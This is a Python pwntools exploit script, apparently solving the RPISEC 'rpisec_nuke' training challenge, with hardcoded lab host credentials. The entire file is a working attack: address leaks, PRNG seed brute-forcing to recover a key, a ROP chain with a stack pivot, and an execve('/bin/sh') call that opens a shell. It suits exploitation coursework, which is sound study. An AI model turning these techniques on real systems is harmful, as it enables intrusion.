#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.46.167 --user project2 --pass project2start --path /tmp/tdaddyp2/rpisec_nuke
from pwn import *
import re
from subprocess import check_output

def escape_ansi(line):
    ansi_escape =re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)

def unmangle_leak(line):
    line = line.split('.')
    line = [line[i:i+4] for i in xrange(0, len(line), 4)]
    line = [''.join(x) for x in line]
    line = [u32(x.decode('hex')) for x in line]
    return line

def build_progstring(instructions):
    fill_length = 127 - len(instructions) - 1 # -1 for checksum
    instructions += [0xffffffff]*fill_length
    instructions += [calculate_checksum(instructions),]
    sinstructions = [p32(x).encode('hex') for x in instructions]
    return ''.join(sinstructions)

def calculate_checksum(addresses):
    cs = 0x00000000
    for i in addresses:
        cs ^= i
    cs ^= 0xdcdc59a9
    cs ^= 0x444e4500
    cs &= 0xffffffff
    return cs

def write_addr(address):
    saddr = p32(address)
    return write_string(saddr)
           
def write_string(str):
    return [u32('S%sIF' % x) for x in str]

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rpisec_nuke')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.46.167'
port = int(args.PORT or 22)
user = args.USER or 'project2'
password = args.PASSWORD or 'project2start'
remote_path = '/tmp/tdaddyp2/rpisec_nuke'

# Connect to the remote SSH server
shell = None

'''
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)
'''

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell,cwd='/tmp/tdaddyp2/', *a, **kw)
    else:
        #return shell.process([remote_path] + argv,cwd='/tmp/tdaddyp2/', *a, **kw)
        return connect(host,port)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

detonate_nuke = 0x4021
get_unum      = 0x15f9
stack_pivot   = 0x2cd4
read          = 0x11d0
xchg_ecx      = 0xab67
xchg_edx      = 0xad1f
pop_ebx       = 0x1191
syscall       = 0x1682
pop3          = 0x1ec3

n86_payload_doom = build_progstring(
                                write_string("GENERAL DOOM") +
                                [u32('DOOM')]
                               )

n86_payload_leak = build_progstring(
                                    [u32('IIII')]*32 + #inc status pointer to function pointers
                                    [u32('OIOI')]*2  + #leak addr for disarm_nuke() and move pointer to *launch_nuke()
                                    [u32('RFFF')]      #leak address, get ready to reprogram
                                   )

io = start()

io.recvuntil('LAUNCH SESSION')
wopr_addr = int(escape_ansi(io.recvline().split()[1]))

log.info("leaked wopr: %s" % hex(wopr_addr))

with log.progress("popping first lock...") as p:
    io.sendlineafter("MENU SELECTION:", "1")
    io.sendlineafter("INSERT LAUNCH KEY:", "\x00\n")
    p.success("done")

with log.progress("popping third lock...") as p:
    io.sendlineafter("MENU SELECTION:", "3")
    io.sendlineafter("PLEASE CONFIRM LAUNCH SESSION #:", "0\n") # this number just can't be the session #
    
    io.sendlineafter("MENU SELECTION:", "2")
    io.sendlineafter("ENTER AES-128 CRYPTO KEY:", "0" * 32)
    io.sendlineafter("ENTER LENGTH OF DATA (16 OR 32):", "32")
    io.sendlineafter("ENTER DATA TO ENCRYPT:", "\x00" * 16 + "\x00" * 13 + '\x83\x1e\x84')
    p.success("done")

with log.progress("popping second lock...") as p:
    io.sendlineafter("MENU SELECTION:", "3")
    io.recvuntil("CHALLENGE (64 Bytes):")
    io.recvline()

    #do the mangling
    rand_leak = unmangle_leak(escape_ansi(io.recvline()).strip())
    log.info("leaked rand: " + ' '.join(["%d" % i for i in rand_leak]))
    io.recvline() #trash
    io.recvline() #trash
    key_leak = unmangle_leak(escape_ansi(io.recvline()).strip())
    log.info("mangled key: " + ' '.join([hex(i) for i in key_leak]))

    io.recvuntil("TIME NOW:")
    time = int(escape_ansi(io.recvline()).strip())
    io.sendlineafter("YOUR RESPONSE:", "\n")


    log.info("got system time: %d" % time)

    bf_seed = None
    bf_rands = None
    with log.progress("brute forcing seed...") as p2:
        for i in xrange(time, -1, -1):
            rands = check_output(["./rand_bf", "%d" % i, "%d" % wopr_addr])
            rands = rands.split()
            rands = [int(x) for x in rands]
            
            if rands[0:len(rand_leak)] == rand_leak:
                bf_seed = i
                bf_rands= rands
                break
        p2.success("%d" % bf_seed)

    key_rands = bf_rands[-4:]
    cracked_key = [key_leak[i] ^ key_rands[i] for i in range(0, len(key_leak))]
    cracked_key_str = ''.join([p32(x).encode('hex') for x in cracked_key])
    log.info("recovered key: " + cracked_key_str)

    io.sendlineafter("MENU SELECTION:", "2")
    io.sendlineafter("ENTER AES-128 CRYPTO KEY:", cracked_key_str)
    io.sendlineafter("ENTER LENGTH OF DATA (16 OR 32):", "16")
    io.sendlineafter("ENTER DATA TO ENCRYPT:", "KING CROWELL\x00\n")
    p.success("done")

with log.progress("programming nuke...") as p:
    io.sendlineafter("PRESS ENTER TO RETURN TO MENU","")
    io.sendlineafter("MENU SELECTION:", "4")
    io.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", n86_payload_leak)
    io.sendlineafter("PRESS ENTER TO RETURN TO MENU", "")
    p.success("done")
        
leak_text = []

with log.progress("leaking .text addr...") as p:
    io.sendlineafter("MENU SELECTION:", "confirm")

    for i in range(0,4):
        io.recvuntil("CYBER NUKE TARGETING STATUS:")
        leak_text.insert(0, escape_ansi(io.readline().strip())[2:])
    leak_text = int(''.join(leak_text),16)
    p.success(hex(leak_text))
    
leak_text -= detonate_nuke
    
with log.progress("building payload...") as P:
    rop_chain = write_addr(leak_text + read) + write_addr(leak_text + pop3) + write_addr(0) + write_addr(wopr_addr) + write_addr(8) + \
                write_addr(leak_text + get_unum) + \
                write_addr(leak_text + pop_ebx) + write_addr(wopr_addr) + \
                write_addr(leak_text + syscall)

    n86_payload_shell = build_progstring( 
                                        rop_chain +
                                        [u32('IIII')] * (33-(len(rop_chain)/4)) + #inc status pointer to function pointers
                                        write_addr(leak_text + stack_pivot) +     #overwrite detonate_nuke
                                        [u32('DOOM')]
                                   )
    p.success("done")
    
with log.progress("programming and triggering payload...") as p:
    io.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", n86_payload_shell)

    io.sendline("/bin/sh\x00")
    io.sendline("%d" % 0xb)
    p.success("done")

#io.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", n86_payload2)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

